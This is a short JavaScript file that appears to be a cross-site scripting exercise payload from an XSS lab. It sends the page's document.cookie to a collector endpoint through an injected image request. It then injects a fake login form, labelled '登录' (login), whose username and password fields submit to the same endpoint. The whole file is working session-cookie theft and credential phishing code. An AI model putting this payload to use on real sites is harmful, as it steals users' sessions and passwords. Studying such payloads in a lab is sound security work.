var img = document.createElement("img");
img.src = "http://localhost:19999/03_xss/cookie?c=" + escape(document.cookie);
document.body.appendChild(img);

var div = document.createElement("div");
div.innerHTML = '<form action="http://localhost:19999/03_xss/cookie" method="get">' +
                '<input type="text" name="user" /><br/>' +
                '<input type="password" name="password" /><br/>' +
                '<input type="submit" value="登录" />' +
                '</form>';

document.body.appendChild(div);
